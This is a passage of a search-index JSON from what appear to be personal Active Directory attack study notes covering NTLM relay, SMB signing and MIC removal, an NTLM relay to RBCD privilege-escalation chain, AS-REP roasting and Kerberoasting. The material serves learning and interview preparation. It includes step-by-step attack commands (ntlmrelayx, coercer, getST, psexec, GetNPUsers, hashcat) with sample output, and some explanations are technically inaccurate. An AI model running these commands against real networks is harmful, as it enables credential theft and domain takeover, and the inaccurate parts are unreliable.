challenge"},{"id":"problem","u":"01_attacks-lateral-movement.html#problem","sec":"Attacks + Lateral Movement","lvl":4,"t":"❌ Problem","c":"Still relies on DES Not as secure as NTLMv2"},{"id":"ntlmv1-vs-ntlmv2-enhanced-comparison","u":"01_attacks-lateral-movement.html#ntlmv1-vs-ntlmv2-enhanced-comparison","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 5. NTLMv1 vs NTLMv2 (Enhanced Comparison)","c":"Feature | NTLMv1 | NTLMv2 | — | — | — | Password Hash | MD4 | MD4 | Crypto | DES | HMAC-MD5 | Randomness | ❌ None | ✅ Client Challenge | Timestamp | ❌ No | ✅ Yes | Structure | Fixed | Dynamic (Blob) | Crackable | Easy | Hard | Relay resistance | ❌ No | ❌ No |"},{"id":"critical-concepts-you-must-remember","u":"01_attacks-lateral-movement.html#critical-concepts-you-must-remember","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 6. Critical Concepts You MUST Remember","c":"🔑 1. Authentication ≠ Password Uses: NT Hash (MD4) Crypto transformation (DES / HMAC-MD5) 🔑 2. NT Hash = Real Secret NT Hash = MD4(password) 👉 If attacker gets this: Pass-the-Hash possible Full authentication possible 🔑 3. NTLM is Challenge-Response Server → Challenge (random) Client → Response: NTLMv1 → DES-based NTLMv2 → HMAC-MD5-based 🔑 4. Designed to stop REPLAY — not RELAY Replay blocked via: Challenge Timestamp (v2) ❗ But: 👉 No protection against man-in-the-middle forwarding"},{"id":"why-this-matters-for-ntlm-relay","u":"01_attacks-lateral-movement.html#why-this-matters-for-ntlm-relay","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 7. Why This Matters for NTLM Relay","c":"💡 Core Weakness Server does NOT verify: Who generated the response Whether connection is original ⚔️ What attacker does Forwards: Challenge → victim Response → target 🚨 Important Insight Attacker NEVER: Knows password Knows NT hash Breaks crypto 👉 Just relays valid authentication"},{"id":"final-mental-model-refined","u":"01_attacks-lateral-movement.html#final-mental-model-refined","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Final Mental Model (Refined)","c":"Think in crypto terms: Server: Give me HMAC/Encrypted proof using your secret Client: Here is proof (DES/HMAC-MD5 output)"},{"id":"attacker","u":"01_attacks-lateral-movement.html#attacker","sec":"Attacks + Lateral Movement","lvl":4,"t":"😈 Attacker:","c":"Doesn’t compute anything Just pipes: Server → Challenge → Victim Victim → Response → Target ➡️ Target verifies crypto → accepts attacker as victim"},{"id":"final-mental-model-enhanced-with-keywords","u":"01_attacks-lateral-movement.html#final-mental-model-enhanced-with-keywords","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Final Mental Model (Enhanced with Keywords)","c":"👤 Client (User Machine) 👉 “I know the password, so I’ll prove it without sending it” Takes password → creates: NT Hash (MD4) Uses: NTLMv2 Key (HMAC-MD5) Server Challenge Blob (client challenge + timestamp + target info) 👉 Sends: Username NTLMv2 Response (NTProofStr + Blob) ✔ No password sent ✔ No NT hash sent"},{"id":"server-service-domain-member","u":"01_attacks-lateral-movement.html#server-service-domain-member","sec":"Attacks + Lateral Movement","lvl":4,"t":"🖥️ Server (Service / Domain Member)","c":"👉 “Let me verify this proof using my stored secret” 🔍 Important correction ❌ Server does NOT get NT hash from blob ✔ Server already has access to NT hash via: Local account → SAM database Domain account → Domain Controller (Active Directory) 🔄 What server actually does Gets NT hash: From SAM DB (local) Or queries Domain Controller Recomputes: NTLMv2 Key = HMAC-MD5(NT Hash, Username + Domain) NTProofStr = HMAC-MD5(NTLMv2 Key, Server Challenge + Blob) Compares: Client response vs computed response ✅ If valid: 👉 Server creates: Authenticated session"},{"id":"full-verification-logic","u":"01_attacks-lateral-movement.html#full-verification-logic","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔄 Full Verification Logic","c":"Server computes: NTLMv2 Key = HMAC-MD5(NT Hash, Username + Domain) Expected Response = HMAC-MD5(NTLMv2 Key, Server Challenge + Blob)"},{"id":"then-compares","u":"01_attacks-lateral-movement.html#then-compares","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔍 Then compares:","c":"Expected Response == Client’s NTProofStr ?"},{"id":"understanding-ntml-relay-workflow","u":"01_attacks-lateral-movement.html#understanding-ntml-relay-workflow","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding NTML Relay WorkFlow","c":""},{"id":"smb-signing-what-why","u":"01_attacks-lateral-movement.html#smb-signing-what-why","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 1. SMB Signing — What & Why","c":"🔐 Concept 👉 SMB Signing = integrity protection for SMB packets Adds a cryptographic signature to each SMB message Ensures: Message not modified Sender is trusted"},{"id":"how-it-works-important","u":"01_attacks-lateral-movement.html#how-it-works-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ How it works (important)","c":"During NTLM authentication: Client & Server negotiate: \"Do we use signing?\" If enabled: A session key is derived from NTLM auth All SMB packets are signed using that key"},{"id":"both-derive-session-key","u":"01_attacks-lateral-movement.html#both-derive-session-key","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Both derive Session Key","c":"After authentication: 👉 BOTH sides compute: Session Key = Function(NT Hash, NTLM Response, Challenge, etc.) ✔ Client computes it ✔ Server computes it 👉 Same input → Same key"},{"id":"key-point","u":"01_attacks-lateral-movement.html#key-point","sec":"Attacks + Lateral Movement","lvl":4,"t":"❗ KEY POINT","c":"👉 The Session Key is NEVER transmitted Not in packets Not encrypted Not shared 👉 It is locally derived on both sides"},{"id":"key-behavior","u":"01_attacks-lateral-movement.html#key-behavior","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Key Behavior","c":"If NOT required → attacker can relay If REQUIRED → relay fails"},{"id":"modes","u":"01_attacks-lateral-movement.html#modes","sec":"Attacks + Lateral Movement","lvl":4,"t":"📊 Modes","c":"Mode | Behavior | — | — | Disabled | No signing → vulnerable | Enabled (not required) | Optional → vulnerable | Required | Enforced → safe |"},{"id":"important-1","u":"01_attacks-lateral-movement.html#important-1","sec":"Attacks + Lateral Movement","lvl":4,"t":"💥 Important","c":"👉 SMB signing protects: Session integrity ❌ NOT: Authentication phase 👉 That’s the gap attackers abuse"},{"id":"mic-message-integrity-code","u":"01_attacks-lateral-movement.html#mic-message-integrity-code","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 2. MIC (Message Integrity Code)","c":"🔐 Concept 👉 MIC = protects NTLM authentication messages Prevents: Tampering NTLM messages Changing flags (like signing) ⚙️ Where it exists Only in: NTLMv2 Not in: NTLMv1 ❌ 🧠 What it protects Negotiation flags Challenge-response messages 🔥 Why MIC matters Without MIC: 👉 Attacker could: Remove \"signing required\" flag With MIC: 👉 Server detects tampering → blocks attack"},{"id":"attack-goal-smb-relay-perspective","u":"01_attacks-lateral-movement.html#attack-goal-smb-relay-perspective","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚔️ 3. Attack Goal (SMB Relay Perspective)","c":"Attacker wants: 👉 Relay NTLM auth → SMB target BUT: 👉 SMB signing blocks it"},{"id":"how-attacker-bypasses-core-logic","u":"01_attacks-lateral-movement.html#how-attacker-bypasses-core-logic","sec":"Attacks + Lateral Movement","lvl":3,"t":"💀 4. How Attacker Bypasses (Core Logic)","c":""},{"id":"scenario-types","u":"01_attacks-lateral-movement.html#scenario-types","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧩 Scenario Types","c":"🔴 Case 1 — SMB Signing NOT Required ✅ Easy Attack Conditions: SMB signing = disabled OR not required Victim authenticates Attack Flow Victim → attacker (SMB auth) Attacker → target (relay) Target accepts → no signing enforced 💥 Result 👉 Attacker gets SMB session as victim 🟡 Case 2 — SMB Signing Required 👉 Attack FAILS normally Because: Server expects signed packets Attacker cannot sign (no session key) 🔴 Case 3 — MIC Removal Attack (Advanced) 👉 This is where your –remove-mic question comes"},{"id":"mic-removal-very-important","u":"01_attacks-lateral-movement.html#mic-removal-very-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 5. MIC Removal (VERY IMPORTANT)","c":"🔐 Problem MIC prevents: Modifying NTLM messages Removing signing flags 💀 Solution (Attacker) 👉 Use vulnerabilities like: CVE-2019-1040 CVE-2019-1166"},{"id":"what--remove-mic-does","u":"01_attacks-lateral-movement.html#what--remove-mic-does","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ What -remove-mic does","c":"👉 It: Removes MIC from NTLM message Removes signing requirement flags Replays modified authentication 🧠 Result 👉 Turns: Secure authentication → insecure 👉 Enables: Cross-protocol relay SMB → LDAP SMB → SMB (bypass signing)"},{"id":"important-2","u":"01_attacks-lateral-movement.html#important-2","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚠️ Important","c":"Works only if: Target is vulnerable/unpatched OR NTLMv1 is used (no MIC) image.png"},{"id":"ntlm-rbcd","u":"01_attacks-lateral-movement.html#ntlm-rbcd","sec":"Attacks + Lateral Movement","lvl":3,"t":"NTLM + RBCD","c":""},{"id":"scenario-realistic-setup","u":"01_attacks-lateral-movement.html#scenario-realistic-setup","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 🎯 Scenario (Realistic Setup)","c":""},{"id":"environment","u":"01_attacks-lateral-movement.html#environment","sec":"Attacks + Lateral Movement","lvl":3,"t":"🖥️ Environment","c":"Machine | Role | — | — | Attacker | Kali (your box) | DC | Domain Controller (LDAP target) | Victim | Domain-joined machine | Target | Another machine (for RBCD abuse) |"},{"id":"goal","u":"01_attacks-lateral-movement.html#goal","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 🎯 Goal","c":"👉 No creds → get SYSTEM on TARGET machine Using: Coercer → ntlmrelayx → LDAP → RBCD → Kerberos → SYSTEM"},{"id":"initial-foothold-important","u":"01_attacks-lateral-movement.html#initial-foothold-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"⚙️ 🧩 Initial Foothold (Important)","c":"You need ANY one of these : Network access to domain Ability to reach victim over SMB/RPC No credentials required ❗ 👉 This is why NTLM relay is powerful"},{"id":"attack-flow-overview","u":"01_attacks-lateral-movement.html#attack-flow-overview","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 ⚔️ Attack Flow Overview","c":"1. Coerce victim → force NTLM auth 2. ntlmrelayx receives auth 3. Relay to LDAP (DC) 4. Create machine + set RBCD 5. Use Kerberos to impersonate Administrator 6. Get SYSTEM shell"},{"id":"step-by-step-execution","u":"01_attacks-lateral-movement.html#step-by-step-execution","sec":"Attacks + Lateral Movement","lvl":4,"t":"💻 🔥 Step-by-Step Execution","c":"🧨 Step 1: Start ntlmrelayx (NO responder needed) ntlmrelayx.py -t ldap://192.168.1.10 --delegate-access --remove-mic 🧠 What this does: Listens for SMB/HTTP auth Relays to LDAP Auto: Creates machine Sets RBCD"},{"id":"step-2-coerce-authentication","u":"01_attacks-lateral-movement.html#step-2-coerce-authentication","sec":"Attacks + Lateral Movement","lvl":4,"t":"🎯 Step 2: Coerce authentication","c":"Use Coercer : coercer.py -t 192.168.1.20 -l 192.168.1.100 Where: t = victim l = attacker (you)"},{"id":"what-happens-now","u":"01_attacks-lateral-movement.html#what-happens-now","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔁 What happens now","c":"Victim → SMB → Attacker (ntlmrelayx) → LDAP → DC"},{"id":"step-3-ntlmrelayx-output","u":"01_attacks-lateral-movement.html#step-3-ntlmrelayx-output","sec":"Attacks + Lateral Movement","lvl":4,"t":"📦 Step 3: ntlmrelayx output","c":"[*] SMB connection from 192.168.1.20 [*] Relaying to ldap://192.168.1.10 [*] Authentication successful as DOMAIN\\VICTIM$ [*] Adding computer account ATTACKER-PC$ [*] Successfully added machine account [*] Delegation rights modified successfully!"},{"id":"what-just-happened-important","u":"01_attacks-lateral-movement.html#what-just-happened-important","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 🔥 What Just Happened (Important)","c":"✔ Victim authenticated ✔ You relayed it ✔ LDAP trusted you ✔ You: Created fake machine Gave it delegation rights"},{"id":"step-4-abuse-rbcd-kerberos-phase","u":"01_attacks-lateral-movement.html#step-4-abuse-rbcd-kerberos-phase","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔑 Step 4: Abuse RBCD (Kerberos Phase)","c":"Now use: getST.py -spn cifs/TARGET.domain.local -impersonate Administrator domain.local/ATTACKER-PC$:Password123 [*] Getting ST for user Administrator [*] Saving ticket in Administrator.ccache"},{"id":"step-5-get-system-shell","u":"01_attacks-lateral-movement.html#step-5-get-system-shell","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧨 Step 5: Get SYSTEM shell","c":"export KRB5CCNAME=Administrator.ccache psexec.py -k -no-pass TARGET.domain.local [*] Logged in as NT AUTHORITY\\SYSTEM"},{"id":"key-clarifications-your-doubts","u":"01_attacks-lateral-movement.html#key-clarifications-your-doubts","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 ⚠️ Key Clarifications (Your Doubts)","c":"❓ Do we need Responder? 👉 ❌ NO (in this attack) Tool | Purpose | — | — | Responder | Poison + capture hashes | Coercer | Force authentication | ntlmrelayx | Relay + exploit | 👉 Since you force auth , no need to poison ❓ Why Coercer works? 👉 Uses RPC abuse to trigger: SMB auth HTTP auth Examples: MS-EFSRPC (PetitPotam) PrinterBug DFSCoerce ❓ Why LDAP is used? 👉 Because: Allows object modification Enables: RBCD ACL abuse Shadow creds"},{"id":"full-mental-model","u":"01_attacks-lateral-movement.html#full-mental-model","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 🧠 Full Mental Model","c":"[Coercer] → forces auth ↓ [ntlmrelayx] → relays auth ↓ [LDAP] → executes privileged action ↓ [RBCD] → gives impersonation ↓ [Kerberos] → SYSTEM access"},{"id":"real-world-conditions-required","u":"01_attacks-lateral-movement.html#real-world-conditions-required","sec":"Attacks + Lateral Movement","lvl":4,"t":"🔥 Real-World Conditions Required","c":"Condition | Required | — | — | SMB signing | Disabled / not required | LDAP signing | Not enforced | MachineAccountQuota | > 0 | Victim reachable | Yes |"},{"id":"final-one-liner","u":"01_attacks-lateral-movement.html#final-one-liner","sec":"Attacks + Lateral Movement","lvl":4,"t":"🧠 Final One-Liner","c":"👉 “Force auth → relay to LDAP → write AD → abuse Kerberos → SYSTEM”"},{"id":"as-rep-roasting","u":"01_attacks-lateral-movement.html#as-rep-roasting","sec":"Attacks + Lateral Movement","lvl":2,"t":"AS-REP Roasting","c":""},{"id":"what-asrep-roasting-actually-abuses-correct-mental-model","u":"01_attacks-lateral-movement.html#what-asrep-roasting-actually-abuses-correct-mental-model","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What AS‑REP Roasting Actually Abuses (Correct Mental Model)","c":"AS‑REP Roasting abuses Kerberos Step 2 (AS‑REP) in a domain like Microsoft Active Directory when pre‑authentication is disabled for a user ."},{"id":"what-normally-happens-in-step-2-asrep","u":"01_attacks-lateral-movement.html#what-normally-happens-in-step-2-asrep","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 What normally happens in Step 2 (AS‑REP)","c":"KDC sends back: TGT → encrypted with KDC’s secret key (attacker can’t read this) Encrypted session key → encrypted with user’s long‑term key (derived from password) AS-REP = { Encrypted_TGT, // encrypted with KDC secret Encrypted_For_User = Encrypt(UserKey, logon_session_key) }"},{"id":"what-asrep-roasting-abuses","u":"01_attacks-lateral-movement.html#what-asrep-roasting-abuses","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚨 What AS‑REP Roasting Abuses","c":"When Kerberos pre‑authentication is disabled for a user: ❌ KDC does NOT require proof that the requester knows the password ❌ Anyone can request AS‑REP for that username ✅ KDC still returns: Encrypted_For_User = Encrypt(UserKey, logon_session_key)"},{"id":"key-point-1","u":"01_attacks-lateral-movement.html#key-point-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"🎯 Key Point","c":"❌ Attacker does NOT extract the TGT ❌ Attacker does NOT extract the user password hash directly ✅ Attacker extracts the encrypted session key blob from AS‑REP ✅ That blob is encrypted using the user’s password‑derived key This encrypted blob is what the attacker cracks offline ."},{"id":"what-happens-when-preauth-is-disabled","u":"01_attacks-lateral-movement.html#what-happens-when-preauth-is-disabled","sec":"Attacks + Lateral Movement","lvl":3,"t":"What Happens When Pre‑Auth is Disabled","c":"Normally, when a user requests a TGT (AS‑REQ), the KDC requires pre-authentication , meaning the client proves knowledge of their password. If correct → KDC issues TGT . If incorrect → request denied. If pre-auth is disabled , the KDC does not require the user to prove their password . You just send the username → KDC returns AS‑REP (TGT) encrypted with the user’s NTLM hash . No password, no authentication is needed."},{"id":"key-point-2","u":"01_attacks-lateral-movement.html#key-point-2","sec":"Attacks + Lateral Movement","lvl":3,"t":"Key Point","c":"The AS‑REP you receive is not the plaintext password , it’s the ticket encrypted with the user’s hash . You can save this ticket and crack it offline using a wordlist or brute-force attack."},{"id":"as-rep-roasting-what-it-exploits","u":"01_attacks-lateral-movement.html#as-rep-roasting-what-it-exploits","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 AS-REP Roasting — What It Exploits","c":"AS‑REP Roasting exploits users who have “Do not require Kerberos pre authentication” enabled . This is a misconfiguration , not a Kerberos bug."},{"id":"why-preauthentication-exists","u":"01_attacks-lateral-movement.html#why-preauthentication-exists","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚨 Why Pre‑Authentication Exists","c":"Normally, the Kerberos workflow starts with: 1. Client → KDC: AS‑REQ User sends their username + timestamp encrypted with their password hash . This proves you know your password. 2. KDC → Client: AS‑REP KDC verifies the encrypted timestamp using your password hash. If valid → gives you a TGT ."},{"id":"when-preauthentication-is-disabled","u":"01_attacks-lateral-movement.html#when-preauthentication-is-disabled","sec":"Attacks + Lateral Movement","lvl":3,"t":"❌ When Pre‑Authentication Is Disabled","c":"If the AD user has the flag: Do not require Kerberos pre authentication Then: The user does NOT need to prove their identity. Any attacker can request an AS‑REP for that username. The KDC will simply return a TGT encrypted with the user’s NTLM hash . And THAT encrypted blob is what the attacker cracks offline."},{"id":"as-rep-roasting-attack-flow","u":"01_attacks-lateral-movement.html#as-rep-roasting-attack-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"🚀 AS-REP Roasting Attack Flow","c":"Step 1 — Attacker Enumerates Users with Pre-Auth Disabled Using Impacket: GetNPUsers.py domain/ -dc-ip X.X.X.X Or PowerShell: Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth These users are often: old service accounts rarely used accounts misconfigured test accounts Step 2 — Attacker Requests AS‑REP for That User Even without knowing the password, attacker can request an AS‑REP: GetNPUsers.py domain.com/username -request KDC returns: AS‑REP encrypted with user’s NTLM hash Hash format looks like: $krb5asrep$23$user@DOMAIN.COM:.... Step 3 — Attacker Offline-Cracks the Hash Using hashcat: hashcat -m 18200 hash.txt wordlist.txt If password is weak, attacker extracts it."},{"id":"why-asrep-roasting-works","u":"01_attacks-lateral-movement.html#why-asrep-roasting-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔍 Why AS‑REP Roasting Works","c":"Because: No authentication is required. KDC returns a TGT encrypted using user’s NTLM hash. Attacker brute-forces the encrypted blob offline. No domain logon events, no lockouts."},{"id":"kerberoasting-vs-asrep-roasting-interview-table","u":"01_attacks-lateral-movement.html#kerberoasting-vs-asrep-roasting-interview-table","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔥 Kerberoasting vs AS‑REP Roasting (Interview Table)","c":"Feature | Kerberoasting | AS‑REP Roasting | — | — | — | Target | Service accounts with SPN | Any user with pre-auth disabled | Requires domain login? | ✔ Yes | ❌ No | Requests | TGS | AS‑REP | Encryption | Encrypted with service account NTLM hash | Encrypted with user NTLM hash | Attack vector | Ticket‑for‑SPN | Ticket‑for‑User | Main weakness | Weak service account passwords | Pre‑auth disabled misconfiguration | Offline cracking? | ✔ Yes | ✔ Yes |"},{"id":"interview-short-answer","u":"01_attacks-lateral-movement.html#interview-short-answer","sec":"Attacks + Lateral Movement","lvl":3,"t":"🧠 Interview Short Answer","c":"AS-REP Roasting targets AD accounts with “Do not require Kerberos preauthentication” enabled. The attacker requests an AS‑REP for that user without knowing the password. The KDC sends an AS‑REP encrypted using the user’s NTLM hash, and the attacker cracks it offline to recover the password. It’s similar to Kerberoasting but doesn’t require domain authentication and targets user accounts, not SPN-linked service accounts."},{"id":"kerberoasting","u":"01_attacks-lateral-movement.html#kerberoasting","sec":"Attacks + Lateral Movement","lvl":2,"t":"Kerberoasting","c":""},{"id":"understanding-the-core-concept-1","u":"01_attacks-lateral-movement.html#understanding-the-core-concept-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Understanding The Core Concept","c":"image.png"},{"id":"what-is-kerberoasting","u":"01_attacks-lateral-movement.html#what-is-kerberoasting","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What is Kerberoasting","c":"Kerberoasting is an Active Directory attack technique where an attacker enumerates service accounts configured with Service Principal Names (SPNs), requests encrypted Ticket Granting Service (TGS) tickets on their behalf, and then cracks those tickets offline to extract plaintext service account credentials"},{"id":"what-kerberoasting-actually-exploits","u":"01_attacks-lateral-movement.html#what-kerberoasting-actually-exploits","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ What Kerberoasting Actually Exploits","c":"Kerberoasting does NOT exploit a bug in Kerberos. It exploits a design weakness : Service accounts use weak passwords, and their Kerberos TGS service tickets (encrypted with the service account’s NTLM hash) can be requested by any authenticated domain user. So the “exploit” is basically abusing normal Kerberos behavior ."},{"id":"how-kerberoasting-works-stepbystep-with-logic","u":"01_attacks-lateral-movement.html#how-kerberoasting-works-stepbystep-with-logic","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ How Kerberoasting Works (Step‑by‑Step, With Logic)","c":"Pre‑conditions Attacker has a valid domain account (any low‑priv user). There are service accounts registered with SPNs . Those service accounts have weak or guessable passwords ."},{"id":"step-1-attacker-enumerates-spns","u":"01_attacks-lateral-movement.html#step-1-attacker-enumerates-spns","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔄 Step 1 — Attacker Enumerates SPNs","c":"The attacker uses any of these: GetUserSPNs.py GetSPNUsers.ps1 setspn -Q * This gives you a list like: Account | SPN | — | — | sqlsvc | MSSQLSvc/server.domain.com | websvc | HTTP/web.domain.com | Logic: Kerberos must associate each service with an account , so these SPN accounts are service accounts."},{"id":"step-2-attacker-requests-a-tgs-ticket-for-that-spn","u":"01_attacks-lateral-movement.html#step-2-attacker-requests-a-tgs-ticket-for-that-spn","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔄 Step 2 — Attacker Requests a TGS Ticket for That SPN","c":"Any normal domain user can request a TGS (Ticket‑Granting Service) ticket for any SPN. Command (example with Impacket): GetUserSPNs.py domain/user:pass -request What happens internally: You ask the KDC (TGS) for a ticket to HTTP/web.domain.com . The KDC creates a TGS and encrypts the service ticket using the NTLM hash of the service account (example: websvc’s password hash). KDC returns this encrypted blob (TGS) to you."},{"id":"core-point-why-this-works","u":"01_attacks-lateral-movement.html#core-point-why-this-works","sec":"Attacks + Lateral Movement","lvl":3,"t":"⚠️ Core Point: Why This Works","c":"👉 The TGS ticket is encrypted with the service account’s NTLM hash. 👉 So if you crack the encrypted ticket, you recover the hash → then the password . This is exactly why we say: Kerberoasting gets you the service account’s NTLM hash inside the TGS."},{"id":"step-3-attacker-extracts-the-ticket-hash-material","u":"01_attacks-lateral-movement.html#step-3-attacker-extracts-the-ticket-hash-material","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔄 Step 3 — Attacker Extracts the Ticket (Hash Material)","c":"Tools extract the ticket into a crackable hash format , ex: $krb5tgs$23$*svc_account$DOMAIN.COM$HTTP/web.domain.com:*... This is equivalent to a Kerberos TGS‑REP hash (similar in spirit to NetNTLMv2 hashes)."},{"id":"step-4-offline-bruteforce-dictionary-attack","u":"01_attacks-lateral-movement.html#step-4-offline-bruteforce-dictionary-attack","sec":"Attacks + Lateral Movement","lvl":3,"t":"🔄 Step 4 — Offline Brute‑Force / Dictionary Attack","c":"Using hashcat : hashcat -m 13100 kerberoast_hashes.txt wordlist.txt If the service account has a weak password like: Summer2023! You crack it. Why offline cracking helps: No lockouts No detection from AD Unlimited cracking speed Service accounts often have non‑rotating passwords Usually privileged"},{"id":"finally-what-you-gain","u":"01_attacks-lateral-movement.html#finally-what-you-gain","sec":"Attacks + Lateral Movement","lvl":3,"t":"Finally — What You Gain","c":"Once cracked, you get: ✔ Service account NTLM hash ✔ Service account plaintext password ✔ Often high privileges (SQL, backup, domain join, sometimes domain admin) This now allows: SMB login WinRM/RDP SQL admin Lateral movement Privilege escalation"},{"id":"short-interviewready-answer","u":"01_attacks-lateral-movement.html#short-interviewready-answer","sec":"Attacks + Lateral Movement","lvl":3,"t":"✅ Short Interview‑Ready Answer","c":"Kerberoasting abuses a design flaw in Kerberos where TGS service tickets are encrypted using the service account’s NTLM hash. A normal domain user can request TGS tickets for any SPN, extract the encrypted part, and offline-bruteforce it to recover the service account password. The attack works because the encryption uses the password hash, service accounts often have weak passwords, and ticket cracking happens offline without detection."},{"id":"example-1","u":"01_attacks-lateral-movement.html#example-1","sec":"Attacks + Lateral Movement","lvl":3,"t":"Example","c":""},{"id":"step-1-user-logs-in","u":"01_attacks-lateral-movement.html#step-1-user-logs-in","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 1 – User logs in","c":"alice enters username + password Kerberos derives UserKey = KDF(alice_password) The KDC also knows Alice’s password (stored as derived keys)."},{"id":"step-2-user-gets-a-tgt","u":"01_attacks-lateral-movement.html#step-2-user-gets-a-tgt","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 2 – User gets a TGT","c":"KDC encrypts TGT using UserKey alice decrypts TGT using UserKey Now Alice has a TGT."},{"id":"step-3-user-requests-tgs-for-a-service","u":"01_attacks-lateral-movement.html#step-3-user-requests-tgs-for-a-service","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 3 – User requests TGS for a service","c":"alice (with TGT) → KDC: request TGS for MSSQLSvc/DB01"},{"id":"step-4-kdc-builds-the-service-ticket","u":"01_attacks-lateral-movement.html#step-4-kdc-builds-the-service-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 4 – KDC builds the service ticket","c":"The KDC constructs: Service Ticket: Client = alice@corp.local Service = MSSQLSvc/DB01 SessionKey = K_session Validity = 10:00–20:00"},{"id":"step-5-kdc-encrypts-the-tgs-with-the-service-accounts-key","u":"01_attacks-lateral-movement.html#step-5-kdc-encrypts-the-tgs-with-the-service-accounts-key","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 5 – KDC encrypts the TGS with the service account’s key","c":"ServiceKey = KDF(sqlsvc_password) EncryptedTGS = Encrypt(ServiceTicket, ServiceKey) This encrypted blob is what attackers extract for Kerberoasting."},{"id":"step-6-service-verifies-the-ticket","u":"01_attacks-lateral-movement.html#step-6-service-verifies-the-ticket","sec":"Attacks + Lateral Movement","lvl":3,"t":"Step 6 – Service verifies the ticket","c":"SQL Service derives ServiceKey from sqlsvc_password Decrypt(EncryptedTGS, ServiceKey) ✔ Success → ticket valid ✘ Fail → reject"},{"id":"what-attackers-actually-steal","u":"01_attacks-lateral-movement.html#what-attackers-actually-steal","sec":"Attacks + Lateral Movement","lvl":3,"t":"3️⃣ What Attackers Actually Steal","c":"Attackers do not steal a raw hash. They steal: 🔐 The encrypted service ticket (which is protected by the service account’s password-derived key) This encrypted blob is what gets cracked offline."},{"id":"how-hashcat-cracks-kerberoast-conceptual-example","u":"01_attacks-lateral-movement.html#how-hashcat-cracks-kerberoast-conceptual-example","sec":"Attacks + Lateral Movement","lvl":3,"t":"4️⃣ How Hashcat Cracks Kerberoast (Conceptual Example)","c":"Offline cracking tools (like hashcat) don’t “reverse the encryption.” They do password guessing + verification . Here’s the logic:"},{"id":"attacker-already-has","u":"01_attacks-lateral-movement.html#attacker-already-has","sec":"Attacks + Lateral Movement","lvl":3,"t":"Attacker already has:","c":"EncryptedTGS = Encrypt(ServiceTicket, KDF(sqlsvc_password))"},{"id":"hashcat-tries-guesses","u":"01_attacks-lateral-movement.html#hashcat-tries-guesses","sec":"Attacks + Lateral Movement","lvl":3,"t":"Hashcat tries guesses:","c":"Guess1 = \"Password123\" Key1 = KDF(\"Password123\") Try decrypt EncryptedTGS with Key1 → Decryption fails Guess2 = \"Summer2024!\" Key2 = KDF(\"Summer2024!\") Try decrypt EncryptedTGS with Key2 → Decryption succeeds → Password found How does hashcat know it “succeeded”? Because Kerberos tickets have a known internal structure and checksum. If the decrypted data matches the expected format, the guess is correct."},{"id":"full-mental-model-one-flow","u":"01_attacks-lateral-movement.html#full-mental-model-one-flow","sec":"Attacks + Lateral Movement","lvl":3,"t":"5️⃣ Full Mental Model (One Flow)","c":"User password → UserKey Service password → ServiceKey TGT encrypted with UserKey TGS encrypted with ServiceKey Attacker extracts encrypted TGS Attacker guesses passwords → derives keys → tries decrypt Correct password = successful decryption"},{"id":"how-tool-extracts-hash-from-tgs","u":"01_attacks-lateral-movement.html#how-tool-extracts-hash-from-tgs","sec":"Attacks + Lateral Movement","lvl":3,"t":"How Tool Extracts Hash from TGS","c":""},{"id":"what-do-tools-like-getspnusers-actually-extract","u":"01_attacks-lateral-movement.html#what-do-tools-like-getspnusers-actually-extract","sec":"Attacks + Lateral Movement","lvl":3,"t":"2️⃣ What do tools like GetSPNUsers actually extract?","c":"Tools (e.g., GetSPNUsers / similar Kerberoasting collectors) don’t “steal the password.” They: Ask the KDC for a TGS for a service Receive a service ticket Extract the encrypted portion of that ticket Convert it into a format that offline crackers understand So yes — they extract the encrypted blob derived from the service account’s secret . Important nuance: You are cracking the Kerberos ticket encryption , not a raw NTLM hash dump."},{"id":"what-are-23-and-18-hash-types-explained","u":"01_attacks-lateral-movement.html#what-are-23-and-18-hash-types-explained","sec":"Attacks + Lateral 